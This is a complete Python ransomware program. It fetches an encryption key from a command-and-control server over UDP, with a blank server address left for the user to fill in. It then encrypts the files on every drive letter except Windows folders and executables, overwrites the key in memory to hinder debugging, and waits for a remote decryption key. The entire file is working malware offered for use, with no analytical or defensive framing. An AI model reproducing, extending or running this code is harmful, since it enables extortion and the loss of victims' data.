import os
import sys
import time
import string
import socket
import ctypes

from cryptography.fernet import Fernet


def request_key():

    socket.setdefaulttimeout(15) # slow down key requests to the C&C server and allow time for a response to be sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    sock.bind((ip_address, 27015))

    server_ip = '' # add the IP address of your remote server
    server_port = 30000 # add the port your remote server is listening on

    response = None

    print('Requesting encryption key from %s...' % server_ip)
    print('')

    while 1:
        sock.sendto(host_name.encode(), (server_ip, server_port)) # using host name as unique identifier message
        try:
            response = sock.recvfrom(4096)
            if response != None:
                if len(response[0]) == 44: # the message from the C&C server will always be 44 characters long
                    break
        except:
            continue

    print("Key received: %s" % str(response[0]))
    print('')

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()

    return response[0]


def listen_for_key():

    socket.setdefaulttimeout(None)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    sock.bind((ip_address, 27015))

    message = None

    while 1:
        message = sock.recvfrom(4096)
        if message != None:
            if len(message[0]) == 44:
                print('Decryption instructions received from %s' % message[1][0])
                print('')
                break
        message = None

    sock.shutdown(socket.SHUT_RDWR)
    sock.close()

    return message[0]


def encrypt(key):

    fernet = Fernet(key)

    drives = ['A:/', 'B:/', 'C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/', 'K:/', 'L:/', 'M:/', 'N:/', 'O:/', 'P:/', 'Q:/', 'R:/', 'S:/', 'T:/', 'U:/', 'V:/', 'W:/', 'X:/', 'Y:/', 'Z:/']

    for drive in drives:

        if os.path.exists(drive):

            for current_directory, sub_directories, files in os.walk(drive):

                if 'Windows' not in current_directory and 'windows' not in current_directory: # rudimentary check to ensure no critical system files are encrypted
                    
                    os.chdir(current_directory)

                    for file_name in files:

                        if '.exe' not in file_name: # rudimentary check to ensure no executables are encrypted

                            try:
                                with open(file_name, "rb") as file:
                                    unencrypted_data = file.read(100000000) # only read up to 100MB of data from a file

                                encrypted_data = fernet.encrypt(unencrypted_data)

                                with open(file_name, "wb") as file:
                                    file.write(encrypted_data)
                            except: # this lazy exception handling may result in some files being skipped
                                continue
    
    ctypes.memset(id(key) + (sys.getsizeof(key) - (len(key) + 1)), 0, len(key) + 1) # overwrite key stored in memory to prevent debugging attempts

    print("Encryption successful. Waiting for decryption instructions...")
    print('')


def decrypt(key):

    fernet = Fernet(key)

    drives = ['A:/', 'B:/', 'C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/', 'K:/', 'L:/', 'M:/', 'N:/', 'O:/', 'P:/', 'Q:/', 'R:/', 'S:/', 'T:/', 'U:/', 'V:/', 'W:/', 'X:/', 'Y:/', 'Z:/']

    for drive in drives:

        if os.path.exists(drive):

            for current_directory, sub_directories, files in os.walk(drive):

                if 'Windows' not in current_directory and 'windows' not in current_directory:
                    
                    os.chdir(current_directory)

                    for file_name in files:

                        if '.exe' not in file_name:

                            try:
                                with open(file_name, "rb") as file:
                                    encrypted_data = file.read(200000000) # read up to 200MB of data from the file when decrypting due to the increase in file size from encrypting

                                unencrypted_data = fernet.decrypt(encrypted_data)

                                with open(file_name, "wb") as file:
                                    file.write(unencrypted_data)
                            except:
                                continue

    ctypes.memset(id(key) + (sys.getsizeof(key) - (len(key) + 1)), 0, len(key) + 1)

    print("Decryption successful. Terminating...")
    print('')


if __name__ == "__main__":

    response = request_key()
    encrypt(response)

    response = listen_for_key()
    decrypt(response)